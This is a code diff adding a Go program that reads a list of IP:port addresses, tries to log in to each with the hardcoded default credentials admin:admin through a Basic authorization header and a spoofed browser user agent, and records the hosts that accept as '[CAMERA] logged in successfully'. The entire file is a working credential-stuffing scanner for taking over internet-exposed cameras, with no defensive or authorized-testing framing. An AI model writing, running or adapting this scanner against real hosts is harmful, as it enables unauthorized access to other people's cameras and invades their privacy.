@@ -1,0 +1,126 @@
+package main
+
+import (
+	"bufio"
+	"context"
+	"fmt"
+	"log"
+	"net/http"
+	"os"
+	"time"
+)
+
+func main() {
+	fileName := "ips.txt"
+	successfulFile := "successful.txt"
+	batchSize := 10
+
+	file, err := os.Open(fileName)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	successfulIPs := []string{}
+	ipCount := 0
+
+	ctx := context.Background()
+	ctx, cancel := context.WithTimeout(ctx, 10*time.Second) // Set the timeout duration to 10 seconds
+	defer cancel()
+
+	client := &http.Client{}
+	client.Timeout = 10 * time.Second // Set the client timeout to 10 seconds
+
+	for scanner.Scan() {
+		ipPort := scanner.Text()
+		success, err := sendRequest(ctx, client, ipPort)
+		if err != nil {
+			log.Printf("Request failed for %s: %v\n", ipPort, err)
+			continue
+		}
+
+		if success {
+			successfulIPs = append(successfulIPs, ipPort)
+		}
+
+		ipCount++
+		if ipCount%batchSize == 0 {
+			err = writeSuccessfulIPs(successfulIPs, successfulFile)
+			if err != nil {
+				log.Fatal(err)
+			}
+			successfulIPs = []string{}
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		log.Fatal(err)
+	}
+
+	if len(successfulIPs) > 0 {
+		err = writeSuccessfulIPs(successfulIPs, successfulFile)
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
+
+	fmt.Println("Successfully logged in IP:PORT combinations saved to 'successful.txt'")
+}
+
+func sendRequest(ctx context.Context, client *http.Client, ipPort string) (bool, error) {
+	url := fmt.Sprintf("http://%s/", ipPort)
+
+	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
+	if err != nil {
+		return false, err
+	}
+
+	req.Header.Set("Cache-Control", "max-age=0")
+	req.Header.Set("Authorization", "Basic YWRtaW46YWRtaW4=")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36")
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+	req.Header.Set("Accept-Encoding", "gzip, deflate")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("Connection", "close")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		if ctx.Err() == context.DeadlineExceeded {
+			return false, fmt.Errorf("request timed out for %s", ipPort)
+		}
+		return false, err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == http.StatusOK {
+		log.Printf("[CAMERA] logged in successfully to: %s\n", ipPort)
+		return true, nil
+	}
+
+	return false, nil
+}
+
+func writeSuccessfulIPs(ips []string, fileName string) error {
+	file, err := os.OpenFile(fileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	writer := bufio.NewWriter(file)
+	for _, ip := range ips {
+		_, err := writer.WriteString(ip + "\n")
+		if err != nil {
+			return err
+		}
+	}
+
+	err = writer.Flush()
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
